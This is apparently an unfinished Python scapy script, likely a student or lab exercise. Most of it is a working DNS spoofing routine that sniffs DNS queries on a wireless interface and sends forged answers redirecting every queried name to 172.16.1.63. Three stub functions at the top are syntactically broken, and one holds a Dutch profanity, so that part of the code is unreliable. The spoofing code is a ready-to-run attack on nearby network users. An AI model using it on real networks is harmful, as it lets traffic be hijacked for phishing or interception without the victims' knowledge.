from scapy.all import *
import scanning as scan

def filter_captured_packets:
    romy = True

def change_packet:
    chantal= True

def return_packet:
    Kees = "Kut"


#testing examples
def dns_spoof(pkt):
    redirect_to = '172.16.1.63'
    if pkt.haslayer(DNSQR): # DNS question record
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
        send(spoofed_pkt)
        print 'Sent:', spoofed_pkt.summary()
sniff(filter='udp port 53', iface='wlan0', store=0, prn=dns_spoof)